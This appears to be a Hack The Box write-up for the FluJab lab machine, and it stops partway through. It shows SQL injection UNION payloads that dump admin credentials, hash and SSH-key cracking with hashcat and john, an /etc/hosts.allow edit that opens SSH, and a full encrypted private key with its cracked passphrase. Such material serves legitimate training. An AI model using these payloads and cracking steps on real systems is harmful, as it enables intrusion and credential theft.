## FluJab machine on HTB
### URL: https://app.hackthebox.com/machines/171
### Difficulty: Hard

## Solution
### Retrieving the Admin's account from the database
```
Query ==> hostnames
[Result #1] sysadmin-console-01.flujab.htb
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(access), 4, 5 FROM vaccinations.admin -- -
Query ==> emails
[Result #2] syadmin@flujab.htb
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(email), 4, 5 FROM vaccinations.admin -- -
Query ==> usernames
[Result #3] sysadm
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(loginname), 4, 5 FROM vaccinations.admin -- -
Query ==> passwords
[Result #4] a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602
[+] Payload sent: ' UNION SELECT 1, 2, GROUP_CONCAT(password), 4, 5 FROM vaccinations.admin -- -
Query ==> 
```
### Cracking the Hash
After retrieving the hostname (`sysadmin-console-01.flujab.htb`), the username (`sysadm`), and the email address (`sysadmin@flujab.htb`), we discovered that the password for this user is stored as a hash: `a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602`.

```
soliman@Legion:~/hash-identifier$ /usr/bin/python3 hash-identifier.py
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602

Possible Hashs:
[+] SHA-256
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
```

```
soliman@Legion:~$ hashcat -m 1400 hash wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-13th Gen Intel(R) Core(TM) i7-13700HX, 2848/5760 MB (1024 MB allocatable), 24MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 6 MB

Dictionary cache hit:
* Filename..: wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:th3doct0r

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: a3e30cce47580888f1f185798aca22ff10be617f4a982d67643...508602
Time.Started.....: Wed Jul  9 20:14:10 2025 (1 sec)
Time.Estimated...: Wed Jul  9 20:14:11 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7198.4 kH/s (0.33ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3280896/14344384 (22.87%)
Rejected.........: 0/3280896 (0.00%)
Restore.Point....: 3268608/14344384 (22.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: thaneerat -> testtest**+
Hardware.Mon.#1..: Util:  4%

Started: Wed Jul  9 20:13:58 2025
Stopped: Wed Jul  9 20:14:12 2025
soliman@Legion:~$
```
### Authentication Bypass
Login to https://sysadmin-console-01.flujab.htb:8080/view/login/normal using `sysadm`:`th3doct0r`

### RCE
After we logged-in successfully, we navigate to [Notepad](https://sysadmin-console-01.flujab.htb:8080/view/notepad) and click `Open` so we can allow our IP address to SSH to the machine by openning `/etc/hosts.allow` and add new couple of lines `sshd: <ATTACKER's IP ADDRESS>\nALL: 10.10.16.6` then click `Save`:
```
# grant ssh access per host
# syntax:
# sshd : [host ip]
###########################

sshd: 10.10.16.6
ALL: 10.10.16.6
```
**If we tried to SSH to the machine before Allowing our IP**
```
C:\Users\moham>ssh 10.10.10.124
kex_exchange_identification: read: Connection reset
Connection reset by 10.10.10.124 port 22

C:\Users\moham>
```
**If we tried to SSH to the machine after Allowing our IP**
```
C:\Users\moham>ssh 10.10.10.124
The authenticity of host '10.10.10.124 (10.10.10.124)' can't be established.
ED25519 key fingerprint is SHA256:DI5pLQ22nYlC140XgwyLNkRXIisiKpcqqXJ0cUncHjI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.124' (ED25519) to the list of known hosts.
moham@10.10.10.124: Permission denied (publickey).

C:\Users\moham>
```
Now, we grap the private key of the user `drno` from `/home/drno/.ssh/userkey` and save it to a file called `private.pem`:
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B

zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
-----END RSA PRIVATE KEY-----

```
At this point, we need to crack the private key so we know the SSH password of the user `drno`:
```
soliman@Legion:~/JohnTheRipper/run$ /usr/bin/python3 ssh2john.py ~/private.pem
/home/soliman/private.pem:$sshng$1$16$6F8D2ABE85DA1FE16846D997BD04E40B$1200$ccf898812e7f2d9a8366be2d14b1e23acca6fdb691717986b18c03e5b23619d1fc49a4052f3a79bee586bd894fb4507cc3806b916a53a7c19c3214cf5f1bbbd22569c36cd1a5fb146010dab0dbf275ec732166444ecf6b427bd3aac971090cf9c0c20b932541e15db6db75fcdf29b7cbfe08f5d76e56caaaf560323949f67d6e272106fc489dc27f1376627abf6c96b2bfe7e63dec54a02898411f3442e368a9d85250a5429a04b638d5a0ec32c8225f54f8486946b77fea2a8117a604ff12aa3a83924a2208cda2c0d4424fa0d178c6e7aacaa6de937380a6e0c0cdb9714cc58bdc6eea29a1d63f393ddea7514be1f2829618cb6bd59801b447d737ee91acf4b035cccd8e7c02f3e241c012b7076befc4dbd148bfbbdeac3db13ad715f772b5b6190076ffbeb48b8e1380a11d7e97667e29bed4dc7874188c76c7babd8a05e9f347f33c8b77ee5cfa7b0471cc1895938d19fa687376a838a8f0801509c8cfa27590df2295af6d57c7c7c9f5070d2e852577d10fbf7b0e71275e82eef2396c9f4540e0b5db73dcdc3bcfb424c0428ef8d13a7fe88543fdecd2ac5c9fc3114c2beabae9f82b859c4937a96da71ddae9538d29e306554d54abc809a2d9d6e95f38c5cdfc7d1bd5f5538c2c44de56e287b82925bea3cef97bc3e9890a0ccf4609bf4bdc679ccf8b8a7561e4d18d663dc8b5a6b2dc364b01c63830fd3713bef2bbb05f6aa9c8c34c9650e88bb257a4846d8a9d642868cb3120e2eb953a2dbd307eba846fc44bb6a86995f076c681291beabaa815b5577096200f0d99983843a067c733a51df487013acbded41b1f8497a942d9bfe0986c46fdda97322ed58b91bd678d20d93a47b9c313c12def19675aa293d1007aa5f39848e90ba4ef25ef53af1a7296cf78916dedbed6aa285b6e8edd52b7f1bdab677d7a41e5e406de6089acb0e0bf2353db6d118007fd58075df4137cc9b50485120905842f4cafe4b83b5d8b33627de39c381cdfd5db5004d8044e68180cf61f7078c3b4a353c4b081aed96a822af7bb6b0056486b5cda6a8c3aefea3a87d5b8f683250680ec2f5f87140bf686fce6634c9cb22b2b4a549d6fa0cf0df03ed0a12bad71aee783d3fa3dea86bebb09d8d63e42b5cb3efe8de0137fe0d18beb581edcbab7c02c8a5a2d98d1c261f5eccceb27939c4d3fa09957c59b717501d35146cee544d7e6d0d18b2e56e51d86210c6554ef1b82fbd2eef359c91e033be3e6748ad331d760783b66490ec09fbd08a1ac8463a16b06d5e277c23f1d5aaba117abd3a77fa2c07575567b10978da163e65be005d613c512f538330099fa40bb0620aba8888d3cfc29cd3c53cdde87e338b5095a8e34a3b18e0599298cf1cf0d97b68fc81c64f5b124873096d9313b46e4817c7d652d2da36d7b0cfdcb250652cbebe9236d15879a64e4f74c6490862790e39e037925cd81d6ac38f75fce9cfe9d3670ea15592505af96b52b1ba5f620e6c4c7184810a9efbfa079d4f9901fb580eaab93ad257c08095b18b40aa021ce331f3f8a7f9f7364aca4fa47e8c82d22e222e7b1eb710a1e111d64848fb06f7f70c05272467fa21f3a4d0b9955a8245dc42922934a116c08bf8c8921b8e2212445b4df34f8532b8507fff822e9a0ae511d135736adfcced83618954f893374acdfb7564d1923a3de655b87cd6eeb
soliman@Legion:~/JohnTheRipper/run$
```
```
┌──(kali㉿kali)-[~]
└─$ john drno.ssh --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shadowtroll      (private.pem)     
1g 0:00:00:00 DONE (2025-07-09 14:06) 4.000g/s 5188Kp/s 5188Kc/s 5188KC/s shadowtroll..shadowone
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```
Now, generate the public key:
